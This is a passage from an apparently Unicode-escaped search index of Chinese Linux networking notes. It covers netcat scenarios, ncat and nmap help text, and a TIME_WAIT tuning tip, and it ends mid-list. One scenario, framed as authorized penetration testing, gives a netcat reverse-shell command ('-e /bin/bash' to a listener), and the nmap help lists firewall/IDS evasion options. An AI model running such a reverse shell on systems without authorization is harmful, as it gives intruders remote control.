\u4e1a\u52a1\u9700\u6c42\uff1a\u9a8c\u8bc1\u516c\u53f8\u7f51\u7ad9\uff08\u4f8b\u5982 companywebsite.com \uff09\u7684HTTP\uff0880\uff09\u7aef\u53e3\u662f\u5426\u5f00\u653e\u3002 \u547d\u4ee4\uff1a nc -zv companywebsite.com 80 \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5c1d\u8bd5\u8fde\u63a5\u5230 companywebsite.com \u768480\u7aef\u53e3\uff0c\u5e76\u663e\u793a\u662f\u5426\u6210\u529f\u8fde\u63a5\u3002 2.\u573a\u666f\uff1a\u7cfb\u7edf\u7ba1\u7406\u5458\u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u670d\u52a1 \u4e1a\u52a1\u9700\u6c42\uff1a\u7cfb\u7edf\u7ba1\u7406\u5458\u9700\u8981\u5728192.168.1.5\u7684\u670d\u52a1\u5668\u4e0a\u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u6587\u4ef6\u4f20\u8f93\u670d\u52a1\uff0c\u4ee5\u4fbf\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u4e0b\u8f7d\u4e00\u4e2a\u540d\u4e3a important_data.zip \u7684\u6587\u4ef6\u3002 \u547d\u4ee4\uff08\u670d\u52a1\u5668\u7aef\uff09\uff1a nc -lk 1234 < /path/to/important_data.zip \u547d\u4ee4\uff08\u5ba2\u6237\u7aef\uff09\uff1a nc 192.168.1.5 1234 > important_data.zip \u8fd9\u4e24\u4e2a\u547d\u4ee4\u5206\u522b\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u53d1\u9001\u6587\u4ef6\u7684\u670d\u52a1\uff0c\u5e76\u5728\u5ba2\u6237\u7aef\u542f\u52a8\u4e86\u6587\u4ef6\u7684\u63a5\u6536\u3002 3.\u573a\u666f\uff1a\u7f51\u7edc\u5de5\u7a0b\u5e08\u6d4b\u8bd5\u5185\u90e8DNS\u670d\u52a1\u5668\u7684UDP\u7aef\u53e3 \u4e1a\u52a1\u9700\u6c42\uff1a\u7f51\u7edc\u5de5\u7a0b\u5e08\u9700\u8981\u6d4b\u8bd5\u516c\u53f8\u5185\u90e8DNS\u670d\u52a1\u5668\uff08\u4f8b\u5982IP\u4e3a192.168.1.10\uff09\u768453\u7aef\u53e3\u662f\u5426\u6b63\u5e38\u3002 \u547d\u4ee4\uff1a nc -zvu 192.168.1.10 53 \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u68c0\u67e5UDP\u7aef\u53e353\u5728192.168.1.10\u4e0a\u662f\u5426\u5f00\u653e\u3002 4.\u573a\u666f\uff1a\u5f00\u53d1\u4eba\u5458\u6a21\u62df\u7b80\u5355\u7684HTTP\u8bf7\u6c42\u4ee5\u8c03\u8bd5API \u4e1a\u52a1\u9700\u6c42\uff1a\u5f00\u53d1\u4eba\u5458\u9700\u8981\u5411\u672c\u5730\u8fd0\u884c\u7684Web\u670d\u52a1\uff08\u4f8b\u5982\u57288080\u7aef\u53e3\uff09\u53d1\u9001\u4e00\u4e2aHTTP GET\u8bf7\u6c42\uff0c\u4ee5\u68c0\u67e5API\u54cd\u5e94\u3002 \u547d\u4ee4\uff1a echo -e \"GET /api/test HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\" | nc localhost 8080 \u8fd9\u4e2a\u547d\u4ee4\u6a21\u62df\u4e86\u5411\u672c\u57308080\u7aef\u53e3\u7684Web\u670d\u52a1\u53d1\u9001HTTP GET\u8bf7\u6c42\u3002 5.\u573a\u666f\uff1a\u5b89\u5168\u56e2\u961f\u8fdb\u884c\u5185\u90e8\u6e17\u900f\u6d4b\u8bd5 \u4e1a\u52a1\u9700\u6c42\uff1a\u5b89\u5168\u56e2\u961f\u5728\u8fdb\u884c\u6388\u6743\u7684\u6e17\u900f\u6d4b\u8bd5\u65f6\uff0c\u9700\u8981\u4ece\u4e00\u53f0\u5185\u90e8\u673a\u5668\uff08\u4f8b\u5982IP\u4e3a192.168.1.50\uff09\u5efa\u7acb\u53cd\u5411Shell\u8fde\u63a5\u5230\u6d4b\u8bd5\u670d\u52a1\u5668\uff08\u4f8b\u5982IP\u4e3a192.168.1.100\uff0c\u7aef\u53e31234\uff09\u3002 \u547d\u4ee4\uff08\u6d4b\u8bd5\u670d\u52a1\u5668\uff09\uff1a nc -lk 1234 \u547d\u4ee4\uff08\u5185\u90e8\u673a\u5668\uff09\uff1a nc 192.168.1.100 1234 -e /bin/bash \u8fd9\u5bf9\u547d\u4ee4\u5efa\u7acb\u4e86\u4e00\u4e2a\u4ece\u5185\u90e8\u673a\u5668\u5230\u6d4b\u8bd5\u670d\u52a1\u5668\u7684\u53cd\u5411Shell\u8fde\u63a5\u3002 6.\u573a\u666f\uff1a\u6280\u672f\u652f\u6301\u56e2\u961f\u8fdb\u884c\u8fdc\u7a0b\u8bca\u65ad \u4e1a\u52a1\u9700\u6c42\uff1a\u6280\u672f\u652f\u6301\u9700\u8981\u8fdc\u7a0b\u8fde\u63a5\u5230\u5ba2\u6237\u7684\u673a\u5668\u4ee5\u6536\u96c6\u8bca\u65ad\u4fe1\u606f\u3002\u5ba2\u6237\u7684\u673a\u5668IP\u4e3a192.168.1.20\uff0c\u6280\u672f\u652f\u6301\u7684\u76d1\u542c\u670d\u52a1\u5668IP\u4e3a192.168.1.100\uff0c\u7aef\u53e35555\u3002 \u547d\u4ee4\uff08\u6280\u672f\u652f\u6301\u7684\u76d1\u542c\u670d\u52a1\u5668\uff09\uff1a nc -lk 5555 \u547d\u4ee4\uff08\u5ba2\u6237\u7684\u673a\u5668\uff09\uff1a tar czf - /path/to/diagnostic/data | nc 192.168.1.100 5555 \u8fd9\u4e24\u4e2a\u547d\u4ee4\u5141\u8bb8\u5ba2\u6237\u7684\u673a\u5668\u5c06\u8bca\u65ad\u6570\u636e\u538b\u7f29\u5e76\u53d1\u9001\u5230\u6280\u672f\u652f\u6301\u7684\u76d1\u542c\u670d\u52a1\u5668\u3002 7.\u573a\u666f\uff1a\u6570\u636e\u5e93\u7ba1\u7406\u5458\u68c0\u67e5\u6570\u636e\u5e93\u7aef\u53e3\u7684\u8fde\u901a\u6027 \u4e1a\u52a1\u9700\u6c42\uff1a\u6570\u636e\u5e93\u7ba1\u7406\u5458\u9700\u8981\u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u8bbf\u95ee\u6570\u636e\u5e93\u670d\u52a1\u5668\uff08\u5047\u8bbeIP\u4e3a192.168.1.30\uff09\u4e0a\u7684MySQL\u7aef\u53e3\uff083306\uff09\u3002 \u547d\u4ee4\uff1a nc -zv 192.168.1.30 3306 \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u68c0\u67e5192.168.1.30\u76843306\u7aef\u53e3\u662f\u5426\u5f00\u653e\u3002 8.\u573a\u666f\uff1a\u7f51\u7edc\u7ba1\u7406\u5458\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u7684\u804a\u5929\u670d\u52a1 \u4e1a\u52a1\u9700\u6c42\uff1a\u7f51\u7edc\u7ba1\u7406\u5458\u60f3\u5728\u5185\u90e8\u7f51\u7edc\u4e0a\u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u4e34\u65f6\u7684\u804a\u5929\u670d\u52a1\uff0c\u65b9\u4fbf\u56e2\u961f\u6210\u5458\u4e4b\u95f4\u7684\u6c9f\u901a\u3002\u670d\u52a1\u8fd0\u884c\u5728\u7aef\u53e37777\u3002 \u547d\u4ee4\uff08\u670d\u52a1\u7aef\uff09\uff1a nc -lk 7777 \u547d\u4ee4\uff08\u5ba2\u6237\u7aef\uff09\uff1a nc 192.168.1.100 7777 \u8fd9\u5bf9\u547d\u4ee4\u5728192.168.1.100\u76847777\u7aef\u53e3\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u804a\u5929\u670d\u52a1\u3002 9.\u573a\u666f\uff1a\u8f6f\u4ef6\u5f00\u53d1\u8005\u6d4b\u8bd5\u81ea\u5b9a\u4e49TCP\u534f\u8bae \u4e1a\u52a1\u9700\u6c42\uff1a\u8f6f\u4ef6\u5f00\u53d1\u8005\u6b63\u5728\u5f00\u53d1\u4e00\u4e2a\u57fa\u4e8eTCP\u7684\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u9700\u8981\u5728\u672c\u5730\u6d4b\u8bd5\u534f\u8bae\u7684\u6709\u6548\u6027\u3002 \u547d\u4ee4\uff08\u6a21\u62df\u670d\u52a1\u5668\uff09\uff1a nc -lk 8888 \u547d\u4ee4\uff08\u6a21\u62df\u5ba2\u6237\u7aef\uff09\uff1a nc localhost 8888 \u901a\u8fc7\u8fd9\u5bf9\u547d\u4ee4\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u5728\u672c\u57308888\u7aef\u53e3\u6a21\u62dfTCP\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\uff0c\u8fdb\u884c\u534f\u8bae\u6d4b\u8bd5\u3002 10.\u573a\u666f\uff1a\u7cfb\u7edf\u7ba1\u7406\u5458\u6d4b\u8bd5\u5185\u90e8\u90ae\u4ef6\u670d\u52a1\u5668 \u4e1a\u52a1\u9700\u6c42\uff1a\u7cfb\u7edf\u7ba1\u7406\u5458\u9700\u8981\u6d4b\u8bd5\u516c\u53f8\u5185\u90e8\u90ae\u4ef6\u670d\u52a1\u5668\uff08\u4f8b\u5982IP\u4e3a192.168.1.40\uff09\u7684SMTP\u7aef\u53e3\uff0825\uff09\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002 \u547d\u4ee4\uff1a nc 192.168.1.40 25 \u8fd9\u4e2a\u547d\u4ee4\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u624b\u52a8\u4e0eSMTP\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ee5\u9a8c\u8bc1\u5176\u529f\u80fd\u3002 \u8fd9\u4e9b\u573a\u666f\u5c55\u793a\u4e86 nc \u5728\u5404\u79cd\u5b9e\u9645\u4e1a\u52a1\u73af\u5883\u4e2d\u7684\u591a\u6837\u6027\u548c\u5b9e\u7528\u6027\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5728\u4f7f\u7528\u8fd9\u4e9b\u547d\u4ee4\u65f6\u9700\u8981\u786e\u4fdd\u7f51\u7edc\u5b89\u5168\uff0c\u5e76\u4e14\u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u548c nc \u7248\u672c\u7684\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u8c03\u6574\u547d\u4ee4\u7684\u5177\u4f53\u53c2\u6570\u3002 # nc --help Ncat 7.50 ( https://nmap.org/ncat ) \u4f7f\u7528\u65b9\u6cd5: ncat [\u9009\u9879] [\u4e3b\u673a\u540d] [\u7aef\u53e3] \u5e26\u65f6\u95f4\u7684\u9009\u9879\u9ed8\u8ba4\u4e3a\u79d2\u3002\u53ef\u9644\u52a0'ms'\u8868\u793a\u6beb\u79d2\uff0c's'\u8868\u793a\u79d2\uff0c'm'\u8868\u793a\u5206\u949f\uff0c\u6216'h'\u8868\u793a\u5c0f\u65f6\uff08\u4f8b\u5982 500ms\uff09\u3002 -4 \u4ec5\u4f7f\u7528IPv4 -6 \u4ec5\u4f7f\u7528IPv6 -U, --unixsock \u4ec5\u4f7f\u7528Unix\u57df\u5957\u63a5\u5b57 -C, --crlf \u4f7f\u7528CRLF\u4f5c\u4e3a\u884c\u7ed3\u675f\u5e8f\u5217 -c, --sh-exec <command> \u901a\u8fc7/bin/sh\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 -e, --exec <command> \u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 --lua-exec <filename> \u6267\u884c\u7ed9\u5b9a\u7684Lua\u811a\u672c -g hop1[,hop2,...] \u677e\u6563\u6e90\u8def\u7531\u8df3\u70b9\uff08\u6700\u591a8\u4e2a\uff09 -G <n> \u677e\u6563\u6e90\u8def\u7531\u8df3\u70b9\u6307\u9488\uff084, 8, 12, ...\uff09 -m, --max-conns <n> \u6700\u5927<n>\u4e2a\u540c\u65f6\u8fde\u63a5 -h, --help \u663e\u793a\u6b64\u5e2e\u52a9\u5c4f\u5e55 -d, --delay <time> \u8bfb/\u5199\u4e4b\u95f4\u7b49\u5f85\u65f6\u95f4 -o, --output <filename> \u5c06\u4f1a\u8bdd\u6570\u636e\u8f6c\u50a8\u5230\u6587\u4ef6 -x, --hex-dump <filename> \u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u5c06\u4f1a\u8bdd\u6570\u636e\u8f6c\u50a8\u5230\u6587\u4ef6 -i, --idle-timeout <time> \u8bfb/\u5199\u7a7a\u95f2\u8d85\u65f6 -p, --source-port port \u6307\u5b9a\u4f7f\u7528\u7684\u6e90\u7aef\u53e3 -s, --source addr \u6307\u5b9a\u4f7f\u7528\u7684\u6e90\u5730\u5740\uff08\u4e0d\u5f71\u54cd-l\uff09 -l, --listen \u7ed1\u5b9a\u5e76\u76d1\u542c\u4f20\u5165\u8fde\u63a5 -k, --keep-open \u5728\u76d1\u542c\u6a21\u5f0f\u4e0b\u63a5\u53d7\u591a\u4e2a\u8fde\u63a5 -n, --nodns \u4e0d\u901a\u8fc7DNS\u89e3\u6790\u4e3b\u673a\u540d -t, --telnet \u5e94\u7b54Telnet\u534f\u5546 -u, --udp \u4f7f\u7528UDP\u800c\u975e\u9ed8\u8ba4\u7684TCP --sctp \u4f7f\u7528SCTP\u800c\u975e\u9ed8\u8ba4\u7684TCP -v, --verbose \u8bbe\u7f6e\u8be6\u7ec6\u7ea7\u522b\uff08\u53ef\u591a\u6b21\u4f7f\u7528\uff09 -w, --wait <time> \u8fde\u63a5\u8d85\u65f6 -z \u96f6I/O\u6a21\u5f0f\uff0c\u4ec5\u62a5\u544a\u8fde\u63a5\u72b6\u6001 --append-output \u8ffd\u52a0\u800c\u975e\u8986\u76d6\u6307\u5b9a\u7684\u8f93\u51fa\u6587\u4ef6 --send-only \u4ec5\u53d1\u9001\u6570\u636e\uff0c\u5ffd\u7565\u63a5\u6536\u5230\u7684\uff1bEOF\u65f6\u9000\u51fa --recv-only \u4ec5\u63a5\u6536\u6570\u636e\uff0c\u4e0d\u53d1\u9001\u4efb\u4f55\u6570\u636e --allow \u4ec5\u5141\u8bb8\u7ed9\u5b9a\u4e3b\u673a\u8fde\u63a5\u5230Ncat --allowfile \u5141\u8bb8\u8fde\u63a5\u5230Ncat\u7684\u4e3b\u673a\u5217\u8868\u6587\u4ef6 --deny \u62d2\u7edd\u7ed9\u5b9a\u4e3b\u673a\u8fde\u63a5\u5230Ncat --denyfile \u88ab\u62d2\u7edd\u8fde\u63a5\u5230Ncat\u7684\u4e3b\u673a\u5217\u8868\u6587\u4ef6 --broker \u542f\u7528Ncat\u7684\u8fde\u63a5\u4ee3\u7406\u6a21\u5f0f --chat \u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684Ncat\u804a\u5929\u670d\u52a1\u5668 --proxy <addr[:port]> \u6307\u5b9a\u8981\u901a\u8fc7\u7684\u4ee3\u7406\u4e3b\u673a\u5730\u5740 --proxy-type <type> \u6307\u5b9a\u4ee3\u7406\u7c7b\u578b\uff08\"http\"\u6216\"socks4\"\u6216\"socks5\"\uff09 --proxy-auth <auth> \u4f7f\u7528HTTP\u6216SOCKS\u4ee3\u7406\u670d\u52a1\u5668\u8fdb\u884c\u8ba4\u8bc1 --ssl \u4f7f\u7528SSL\u8fdb\u884c\u8fde\u63a5\u6216\u76d1\u542c --ssl-cert \u6307\u5b9aSSL\u8bc1\u4e66\u6587\u4ef6\uff08PEM\uff09\u7528\u4e8e\u76d1\u542c --ssl-key \u6307\u5b9aSSL\u79c1\u94a5\uff08PEM\uff09\u7528\u4e8e\u76d1\u542c --ssl-verify \u9a8c\u8bc1\u8bc1\u4e66\u7684\u4fe1\u4efb\u548c\u57df\u540d --ssl-trustfile \u5305\u542b\u53d7\u4fe1\u4efbSSL\u8bc1\u4e66\u7684PEM\u6587\u4ef6 --ssl-ciphers \u5305\u542b\u8981\u4f7f\u7528\u7684SSL\u52a0\u5bc6\u5957\u4ef6\u7684Cipherlist --version \u663e\u793aNcat\u7684\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa \u67e5\u770bncat(1)\u624b\u518c\u9875\u4ee5\u83b7\u53d6\u5b8c\u6574","title":"nc\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/net.ipv4.tcp_fin_timeout/","text":"\u63d0\u9ad8Linux\u5e94\u5bf9\u77ed\u8fde\u63a5\u7684\u8d1f\u8f7d\u80fd\u529b \u5728\u5b58\u5728\u5927\u91cf\u77ed\u8fde\u63a5\u7684\u60c5\u51b5\u4e0b\uff0cLinux\u7684TCP\u6808\u4e00\u822c\u90fd\u4f1a\u751f\u6210\u5927\u91cf\u7684 TIME_WAIT \u72b6\u6001\u7684socket\u3002\u4f60\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u770b\u5230\uff1a netstat -ant| grep -i time_wait \u6709\u65f6\u5019\uff0c\u8fd9\u4e2a\u6570\u76ee\u662f\u60ca\u4eba\u7684\uff1a netstat -ant|grep -i time_wait |wc -l \u53ef\u80fd\u4f1a\u8d85\u8fc7\u4e09\u56db\u4e07\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539 linux kernel \u7684 tcp time wait\u7684\u65f6\u95f4\uff0c\u7f29\u77ed\u4e4b\uff0c\u6709\u4e2a sysctl \u53c2\u6570\u8c8c\u4f3c\u53ef\u4ee5\u4f7f\u7528\uff0c\u5b83\u662f /proc/sys/net/ipv4/tcp_fin_timeout\uff0c\u7f3a\u7701\u503c\u662f 60\uff0c\u4e5f\u5c31\u662f60\u79d2\uff0c\u5f88\u591a\u7f51\u4e0a\u7684\u8d44\u6599\u90fd\u8bf4\u5c06\u8fd9\u4e2a\u6570\u503c\u8bbe\u7f6e\u4f4e\u4e00\u4e9b\u5c31\u53ef\u4ee5\u51cf\u5c11netstat \u91cc\u9762\u7684TIME_WAIT\u72b6\u6001\uff0c\u4f46\u662f\u8fd9\u4e2a\u8bf4\u6cd5\u662f\u9519\u8bef\u7684\u3002\u7ecf\u8fc7\u8ba4\u771f\u9605\u8bfbLinux\u7684\u5185\u6838\u6e90\u4ee3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u6570\u503c\u5176\u5b9e\u662f\u8f93\u51fa\u7528\u7684\uff0c\u4fee\u6539\u4e4b\u540e\u5e76\u6ca1\u6709\u771f\u6b63\u7684\u8bfb\u56de\u5185\u6838\u4e2d\u8fdb\u884c\u4f7f\u7528\uff0c\u800c\u5185\u6838\u4e2d\u771f\u6b63\u7ba1\u7528\u7684\u662f\u4e00\u4e2a\u5b8f\u5b9a\u4e49\uff0c\u5728 $KERNEL/include/net/tcp.h\u91cc\u9762\uff0c\u6709\u4e0b\u9762\u7684\u884c\uff1a #define TCP_TIMEWAIT_LEN (60*HZ) \u800c\u8fd9\u4e2a\u5b8f\u662f\u771f\u6b63\u63a7\u5236 TCP TIME_WAIT \u72b6\u6001\u7684\u8d85\u65f6\u65f6\u95f4\u7684\u3002\u5982\u679c\u6211\u4eec\u5e0c\u671b\u51cf\u5c11 TIME_WAIT \u72b6\u6001\u7684\u6570\u76ee\uff08\u4ece\u800c\u8282\u7701\u4e00\u70b9\u70b9\u5185\u6838\u64cd\u4f5c\u65f6\u95f4\uff09\uff0c\u90a3\u4e48\u53ef\u4ee5\u628a\u8fd9\u4e2a\u6570\u503c\u8bbe\u7f6e\u4f4e\u4e00\u4e9b\uff0c\u6839\u636e\u6211\u4eec\u7684\u6d4b\u8bd5\uff0c\u8bbe\u7f6e\u4e3a 10 \u79d2\u6bd4\u8f83\u5408\u9002","title":"Linux\u4fee\u6539TCP\u7684TIME-WAIT\u8d85\u65f6\u65f6\u95f4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/netstat%E5%91%BD%E4%BB%A4/","text":"netstat - \u663e\u793a\u7f51\u7edc\u8fde\u63a5\uff0c\u8def\u7531\u8868\uff0c\u63a5\u53e3\u72b6\u6001\uff0c\u4f2a\u88c5\u8fde\u63a5\uff0c\u7f51\u7edc\u94fe\u8def\u4fe1\u606f\u548c\u7ec4\u64ad\u6210\u5458\u7ec4\u3002 \u4e2d\u6587man\u624b\u518c\uff1a netstat(8) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u82f1\u6587man\u624b\u518c\uff1a netstat(8) - Linux man page (die.net)","title":"netstat"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/nmap/","text":"NMAP\u547d\u4ee4 \u5728\u7ebfipv6\u68c0\u6d4b\uff1ahttp://www.ipv6scanner.com/cgi-bin/main.py nmap\u7684\u5e2e\u52a9\u624b\u518c\u771f\u7684\u662f\u53c8\u81ed\u53c8\u957f\uff0c\u53ca\u65f6\u662fhelp\u63d0\u4f9b\u7684\u5185\u5bb9\u4e5f\u975e\u5e38\u591a\uff0c\u4ee5\u4e0b\u662fgpt4\u7406\u89e3\u5e76\u7ffb\u8bd1\u7684\u5185\u5bb9\u3002 nmap - \u7f51\u7edc\u63a2\u7d22\u5de5\u5177\u3001\u5b89\u5168\u6216\u7aef\u53e3\u626b\u63cf\u4eea \u8bed\u6cd5 nmap [\u626b\u63cf\u7c7b\u578b...] [\u9009\u9879] {\u76ee\u6807\u89c4\u8303} Nmap 6.40 (http://nmap.org) \u4f7f\u7528\u65b9\u5f0f: nmap [\u626b\u63cf\u7c7b\u578b] [\u9009\u9879] {\u76ee\u6807\u89c4\u8303} \u76ee\u6807\u89c4\u8303: \u53ef\u4ee5\u8f93\u5165\u4e3b\u673a\u540d\uff0cIP\u5730\u5740\uff0c\u7f51\u7edc\u7b49\u3002 \u4f8b\u5982: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL <\u8f93\u5165\u6587\u4ef6\u540d>: \u4ece\u4e3b\u673a/\u7f51\u7edc\u5217\u8868\u6587\u4ef6\u8f93\u5165 -iR <\u4e3b\u673a\u6570\u91cf>: \u968f\u673a\u9009\u62e9\u76ee\u6807 --exclude <\u4e3b\u673a1[,\u4e3b\u673a2][,\u4e3b\u673a3],...>: \u6392\u9664\u4e3b\u673a/\u7f51\u7edc --excludefile <\u6392\u9664\u6587\u4ef6>: \u4ece\u6587\u4ef6\u6392\u9664\u5217\u8868 \u4e3b\u673a\u53d1\u73b0: -sL: \u5217\u8868\u626b\u63cf - \u4ec5\u5217\u51fa\u8981\u626b\u63cf\u7684\u76ee\u6807 -sn: Ping\u626b\u63cf - \u7981\u7528\u7aef\u53e3\u626b\u63cf -Pn: \u5c06\u6240\u6709\u4e3b\u673a\u89c6\u4e3a\u5728\u7ebf - \u8df3\u8fc7\u4e3b\u673a\u53d1\u73b0 -PS/PA/PU/PY[portlist]: \u5230\u6307\u5b9a\u7aef\u53e3\u7684TCP SYN/ACK\uff0cUDP\u6216SCTP\u53d1\u73b0 -PE/PP/PM: ICMP\u56de\u58f0\uff0c\u65f6\u95f4\u6233\u548c\u7f51\u7edc\u63a9\u7801\u8bf7\u6c42\u53d1\u73b0\u63a2\u9488 -PO[\u534f\u8bae\u5217\u8868]: IP\u534f\u8baePing -n/-R: \u4ece\u4e0d\u8fdb\u884cDNS\u89e3\u6790/\u603b\u662f\u89e3\u6790 [\u9ed8\u8ba4: \u6709\u65f6] --dns-servers <\u670d\u52a1\u56681[,\u670d\u52a1\u56682],...>: \u6307\u5b9a\u81ea\u5b9a\u4e49DNS\u670d\u52a1\u5668 --system-dns: \u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684DNS\u89e3\u6790\u5668 --traceroute: \u8ddf\u8e2a\u5230\u6bcf\u4e2a\u4e3b\u673a\u7684\u8df3\u8f6c\u8def\u5f84 \u626b\u63cf\u6280\u672f: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon\u626b\u63cf -sU: UDP\u626b\u63cf -sN/sF/sX: TCP Null\uff0cFIN\u548cXmas\u626b\u63cf --scanflags <\u6807\u5fd7>: \u81ea\u5b9a\u4e49TCP\u626b\u63cf\u6807\u5fd7 -sI <\u50f5\u5c38\u4e3b\u673a[:\u63a2\u9488\u7aef\u53e3]>: \u95f2\u7f6e\u626b\u63cf -sY/sZ: SCTP INIT/COOKIE-ECHO\u626b\u63cf -sO: IP\u534f\u8bae\u626b\u63cf -b <FTP\u4e2d\u7ee7\u4e3b\u673a>: FTP\u5f39\u8df3\u626b\u63cf \u7aef\u53e3\u89c4\u8303\u548c\u626b\u63cf\u987a\u5e8f: -p <\u7aef\u53e3\u8303\u56f4>: \u4ec5\u626b\u63cf\u6307\u5b9a\u7aef\u53e3 \u4f8b\u5982: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: \u5feb\u901f\u6a21\u5f0f - \u626b\u63cf\u7684\u7aef\u53e3\u6bd4\u9ed8\u8ba4\u626b\u63cf\u5c11 -r: \u8fde\u7eed\u626b\u63cf\u7aef\u53e3 - \u4e0d\u968f\u673a\u5316 --top-ports <\u6570\u91cf>: \u626b\u63cf<\u6570\u91cf>\u4e2a\u6700\u5e38\u89c1\u7684\u7aef\u53e3 --port-ratio <\u6bd4\u4f8b>: \u626b\u63cf\u6bd4<\u6bd4\u4f8b>\u66f4\u5e38\u89c1\u7684\u7aef\u53e3 \u670d\u52a1/\u7248\u672c\u68c0\u6d4b: -sV: \u63a2\u6d4b\u5f00\u653e\u7aef\u53e3\u4ee5\u786e\u5b9a\u670d\u52a1/\u7248\u672c\u4fe1\u606f --version-intensity <\u7ea7\u522b>: \u8bbe\u7f6e\u4ece0 (\u8f7b) \u52309 (\u5c1d\u8bd5\u6240\u6709\u63a2\u9488) --version-light: \u9650\u5236\u6700\u6709\u53ef\u80fd\u7684\u63a2\u9488 (\u5f3a\u5ea62) --version-all: \u5c1d\u8bd5\u6bcf\u4e2a\u5355\u72ec\u7684\u63a2\u9488 (\u5f3a\u5ea69) --version-trace: \u663e\u793a\u8be6\u7ec6\u7248\u672c\u626b\u63cf\u6d3b\u52a8 (\u7528\u4e8e\u8c03\u8bd5) \u811a\u672c\u626b\u63cf: -sC: \u76f8\u5f53\u4e8e --script=default --script=<Lua\u811a\u672c>: <Lua\u811a\u672c>\u662f\u9017\u53f7\u5206\u9694\u7684\u76ee\u5f55\uff0c\u811a\u672c\u6587\u4ef6\u6216\u811a\u672c\u7c7b\u522b\u5217\u8868 --script-args=<n1=v1,[n2=v2,...]>: \u5411\u811a\u672c\u63d0\u4f9b\u53c2\u6570 --script-args-file=\u6587\u4ef6\u540d: \u5728\u6587\u4ef6\u4e2d\u63d0\u4f9bNSE\u811a\u672c\u53c2\u6570 --script-trace: \u663e\u793a\u53d1\u9001\u548c\u63a5\u6536\u7684\u6240\u6709\u6570\u636e --script-updatedb: \u66f4\u65b0\u811a\u672c\u6570\u636e\u5e93\u3002 --script-help=<Lua\u811a\u672c>: \u663e\u793a\u6709\u5173\u811a\u672c\u7684\u5e2e\u52a9\u3002 <Lua\u811a\u672c>\u662f\u811a\u672c\u6587\u4ef6\u6216\u811a\u672c\u7c7b\u522b\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002 \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b: -O: \u542f\u7528\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b --osscan-limit: \u9650\u5236\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u5230\u6709\u5e0c\u671b\u7684\u76ee\u6807 --osscan-guess: \u66f4\u79ef\u6781\u5730\u731c\u6d4b\u64cd\u4f5c\u7cfb\u7edf \u65f6\u5e8f\u548c\u6027\u80fd: \u4f7f\u7528<time>\u7684\u9009\u9879\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6216\u8005\u5c06'ms' (\u6beb\u79d2)\uff0c 's' (\u79d2)\uff0c'm' (\u5206\u949f) \u6216 'h' (\u5c0f\u65f6) \u6dfb\u52a0\u5230\u503c\u540e\u9762 (\u4f8b\u5982 30m)\u3002 -T<0-5>: \u8bbe\u7f6e\u65f6\u5e8f\u6a21\u677f (\u6570\u5b57\u8d8a\u9ad8\u8d8a\u5feb) --min-hostgroup/max-hostgroup <\u5927\u5c0f>: \u5e76\u884c\u4e3b\u673a\u626b\u63cf\u7ec4\u5927\u5c0f --min-parallelism/max-parallelism <\u63a2\u9488\u6570>: \u63a2\u9488\u5e76\u884c\u5316 --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: \u8bbe\u7f6eRTT\u8d85\u65f6 --max-retries <\u5c1d\u8bd5\u6b21\u6570>: \u8bbe\u7f6e\u6700\u5927\u91cd\u8bd5\u6b21\u6570 --host-timeout <\u65f6\u95f4>: \u653e\u5f03\u5bf9\u76ee\u6807\u7684\u626b\u63cf --scan-delay/--max-scan-delay <\u65f6\u95f4>: \u8c03\u6574\u63a2\u9488\u4e4b\u95f4\u7684\u65f6\u95f4 --min-rate <\u901f\u7387>: \u53d1\u9001\u63a2\u9488\u7684\u6700\u5c0f\u901f\u7387 --max-rate <\u901f\u7387>: \u53d1\u9001\u63a2\u9488\u7684\u6700\u5927\u901f\u7387 \u9632\u706b\u5899/IDS\u8eb2\u907f\u548c\u6b3a\u9a97: -f; --mtu <\u503c>: \u5206\u6bb5\u626b\u63cf; \u6307\u5b9a\u81ea\u5b9a\u4e49\u7684MTU -D <\u4f2a\u88c5\u4e3b\u673a1,2,...>: 